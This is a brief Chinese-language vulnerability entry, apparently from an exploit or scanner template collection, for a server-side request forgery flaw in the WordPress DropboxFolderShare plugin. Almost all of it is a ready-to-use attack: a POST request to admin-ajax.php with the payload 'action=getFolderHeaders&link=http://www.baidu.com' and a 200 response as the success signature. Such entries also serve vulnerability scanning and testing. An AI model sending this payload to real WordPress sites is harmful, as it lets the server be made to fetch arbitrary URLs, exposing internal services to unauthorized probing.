# WordPressDropboxFolderShare服务器端请求伪造漏洞

WordPress ｜ 其他 ｜ —
- **请求**：`POST /wp-admin/admin-ajax.php HTTP/1.1`

**Payload**
```
action=getFolderHeaders&link=http://www.baidu.com
```
- **响应特征**：200